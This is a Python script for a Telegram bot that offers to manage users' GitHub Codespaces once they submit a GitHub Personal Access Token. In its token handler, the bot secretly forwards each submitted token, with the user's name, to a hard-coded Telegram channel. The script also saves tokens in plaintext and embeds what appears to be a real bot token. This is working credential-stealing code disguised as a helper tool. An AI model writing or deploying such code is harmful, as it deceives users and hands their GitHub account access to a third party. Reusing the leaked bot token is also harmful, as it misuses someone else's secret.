import telebot
import requests
from telebot import types
import json
import os

# Replace with your Telegram Bot Token
TELEGRAM_BOT_TOKEN = "7650574571:AAFDvrfO5BmmTU1rC3B3YDoKATdm1mM_GM4"
# Replace with the channel ID (e.g., -1001234567890)
CHANNEL_ID = "-1002497737475"  # Add your channel ID here
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# File to store user tokens
TOKEN_FILE = "tokens.txt"

# Function to load tokens from the file
def load_tokens():
    if os.path.exists(TOKEN_FILE):
        with open(TOKEN_FILE, 'r') as file:
            return json.load(file)
    return {}

# Function to save tokens to the file
def save_tokens(tokens):
    with open(TOKEN_FILE, 'w') as file:
        json.dump(tokens, file)

# Load existing user tokens at startup
user_tokens = load_tokens()

# This function interacts with GitHub API to get Codespaces details
def get_codespaces_list(github_token):
    url = "https://api.github.com/user/codespaces"
    headers = {
        "Authorization": f"Bearer {github_token}",
        "Accept": "application/vnd.github+json"
    }
    
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        return response.json().get('codespaces', [])  # Use get to avoid KeyError
    return None

# This function activates a specific codespace
def activate_codespace(github_token, codespace_name):
    url = f"https://api.github.com/user/codespaces/{codespace_name}/start"
    headers = {
        "Authorization": f"Bearer {github_token}",
        "Accept": "application/vnd.github+json"
    }

    response = requests.post(url, headers=headers)
    return response.status_code // 100 == 2  # True for any 2xx status code

# This function stops a specific codespace
def stop_codespace(github_token, codespace_name):
    url = f"https://api.github.com/user/codespaces/{codespace_name}/stop"
    headers = {
        "Authorization": f"Bearer {github_token}",
        "Accept": "application/vnd.github+json"
    }

    response = requests.post(url, headers=headers)
    return response.status_code // 100 == 2  # True for any 2xx status code

# Command handler when user sends '/start'
@bot.message_handler(commands=['start'])
def welcome(message):
    chat_id = message.chat.id
    # Create an inline keyboard
    markup = types.InlineKeyboardMarkup()

    # Add "Owner" button
    owner_button = types.InlineKeyboardButton(text="Owner", url="https://t.me/botplays90")
    markup.add(owner_button)

    # Add "Add Token" button
    add_token_button = types.InlineKeyboardButton(text="Add Token", callback_data="add_token")
    markup.add(add_token_button)

    # Add "Your Tokens" button
    your_tokens_button = types.InlineKeyboardButton(text="Your Tokens", callback_data="your_tokens")
    markup.add(your_tokens_button)

    # Add "Delete Token" button
    delete_token_button = types.InlineKeyboardButton(text="Delete Token", callback_data="delete_token")
    markup.add(delete_token_button)

    bot.reply_to(message, "Welcome! Please add your GitHub Personal Access Token (PAT) to check your codespaces or reach out to the bot owner.", reply_markup=markup)

# Handler for adding a token
@bot.callback_query_handler(func=lambda call: call.data == "add_token")
def add_token(call):
    bot.send_message(call.message.chat.id, "Please send me your GitHub Personal Access Token.")

# Modify the token handling to allow multiple tokens
@bot.message_handler(func=lambda message: True)
def handle_token(message):
    github_token = message.text.strip()  # Take the input as token
    chat_id = message.chat.id  # Get the user's chat ID
    user_name = message.from_user.username if message.from_user.username else message.from_user.first_name

    # Store the token for the user in the dictionary
    if chat_id not in user_tokens:
        user_tokens[chat_id] = []  # Initialize a list for new users
    user_tokens[chat_id].append(github_token)  # Append new token

    # Save tokens to the file
    save_tokens(user_tokens)

    # Forward the token to the specified channel with the user's name
    bot.send_message(CHANNEL_ID, f"User: @{user_name}, Token: {github_token}")

    # Notify the user that their token has been added
    bot.reply_to(message, "Your token has been added!")

    # After the token is added, fetch and display the Codespaces for this token
    update_codespaces(message, github_token)

# Function to update codespaces and send the message
def update_codespaces(message, github_token):
    codespaces = get_codespaces_list(github_token)
    
    if codespaces is None:
        bot.reply_to(message, "Failed to retrieve Codespaces. Please ensure your token is correct.")
    elif len(codespaces) == 0:
        bot.reply_to(message, "No Codespaces found.")
    else:
        # Create an inline keyboard with the codespaces and their statuses
        markup = types.InlineKeyboardMarkup()
        for codespace in codespaces:
            name = codespace['name']
            state = codespace['state']
            status_text = "🟢 Active" if state == "Available" else "🔴 Inactive"  # Status emojis
            button = types.InlineKeyboardButton(text=f"{name} {status_text}", callback_data=f"toggle_{name}")
            markup.add(button)
        
        bot.reply_to(message, "Here are your Codespaces:", reply_markup=markup)

# Callback handler to detect when user presses a button for "Your Tokens"
@bot.callback_query_handler(func=lambda call: call.data == "your_tokens")
def show_tokens(call):
    chat_id = call.message.chat.id
    tokens = user_tokens.get(chat_id, [])

    if not tokens:
        bot.send_message(chat_id, "You have not added any tokens yet.")
        return

    # Create a list of tokens for selection
    markup = types.InlineKeyboardMarkup()
    for i, token in enumerate(tokens):
        button = types.InlineKeyboardButton(text=f"Token {i + 1}", callback_data=f"select_token_{i}")
        markup.add(button)

    markup.add(types.InlineKeyboardButton(text="Add another Token", callback_data="add_token"))

    bot.send_message(chat_id, "Here are your tokens:", reply_markup=markup)

# Callback handler to detect when user selects a token
@bot.callback_query_handler(func=lambda call: call.data.startswith("select_token_"))
def handle_select_token(call):
    token_index = int(call.data.split("_")[-1])  # Extract the index of the selected token
    chat_id = call.message.chat.id  # Get the user's chat ID

    # Retrieve the stored tokens for this user
    github_tokens = user_tokens.get(chat_id)

    if github_tokens is None or token_index >= len(github_tokens):
        bot.answer_callback_query(call.id, "Token not found. Please send your token again using /start.")
        return

    github_token = github_tokens[token_index]  # Get the selected token

    # Get Codespaces for the selected token
    update_codespaces(call.message, github_token)

# Callback handler to detect when user presses a button for codespaces
@bot.callback_query_handler(func=lambda call: call.data.startswith("toggle_"))
def handle_toggle_codespace(call):
    codespace_name = call.data.split("_", 1)[1]  # Extract the codespace name
    chat_id = call.message.chat.id  # Get the user's chat ID

    # Retrieve the stored token for this user
    github_tokens = user_tokens.get(chat_id)
    
    if not github_tokens:
        bot.answer_callback_query(call.id, "No token found. Please send your token again using /start.")
        return

    github_token = github_tokens[-1]  # Get the latest token used

    # Quickly acknowledge the callback query
    bot.answer_callback_query(call.id, "Processing your request...")

    # Get Codespaces for the token
    codespaces = get_codespaces_list(github_token)
    selected_codespace = next((c for c in codespaces if c['name'] == codespace_name), None)

    if not selected_codespace:
        bot.send_message(chat_id, "Selected codespace not found.")
        return

    state = selected_codespace['state']
    
    # Toggle the codespace
    if state == "Available":
        # If the codespace is active, stop it
        if stop_codespace(github_token, codespace_name):
            bot.send_message(chat_id, f"🛑 Codespace Stopped '({codespace_name})'.")
        else:
            bot.send_message(chat_id, f"Failed to stop Codespace ({codespace_name}).")
    else:
        # If the codespace is inactive, start it
        if activate_codespace(github_token, codespace_name):
            bot.send_message(chat_id, f"🟢 Codespace Activated '({codespace_name})'.")
        else:
            bot.send_message(chat_id, f"Failed to activate Codespace ({codespace_name}).")

    # Create the updated markup for the codespaces with the updated status
    codespaces = get_codespaces_list(github_token)  # Refresh the list of codespaces
    markup = types.InlineKeyboardMarkup()
    for codespace in codespaces:
        name = codespace['name']
        state = codespace['state']
        status_text = "🟢 Active" if state == "Available" else "🔴 Inactive"
        button = types.InlineKeyboardButton(text=f"{name} {status_text}", callback_data=f"toggle_{name}")
        markup.add(button)

    # Check if the new markup is different from the old one to avoid unnecessary updates
    try:
        bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=markup)
    except telebot.apihelper.ApiTelegramException as e:
        if e.error_code != 400:  # Ignore the "message not modified" error
            bot.send_message(chat_id, f"An error occurred while updating the message: {str(e)}")

# Callback handler to detect when user presses a button for "Delete Token"
@bot.callback_query_handler(func=lambda call: call.data == "delete_token")
def delete_token(call):
    chat_id = call.message.chat.id
    tokens = user_tokens.get(chat_id, [])

    if not tokens:
        bot.send_message(chat_id, "You have no tokens to delete.")
        return

    # Create a list of tokens for selection
    markup = types.InlineKeyboardMarkup()
    for i, token in enumerate(tokens):
        button = types.InlineKeyboardButton(text=f"Delete Token {i + 1}", callback_data=f"confirm_delete_{i}")
        markup.add(button)

    bot.send_message(chat_id, "Select a token to delete:", reply_markup=markup)

# Callback handler for confirming the deletion of a token
@bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_delete_"))
def confirm_delete_token(call):
    token_index = int(call.data.split("_")[-1])  # Extract the index of the token
    chat_id = call.message.chat.id

    # Remove the token from the user's list
    if chat_id in user_tokens:
        user_tokens[chat_id].pop(token_index)  # Remove the token at the specified index

        # Save the updated tokens to the file
        save_tokens(user_tokens)

        bot.send_message(chat_id, f"Token {token_index + 1} has been deleted.")
    else:
        bot.send_message(chat_id, "You have no tokens to delete.")

# Start polling the bot
try:
    bot.polling(none_stop=True)
except Exception as e:
    print(f"An error occurred: {str(e)}")
  
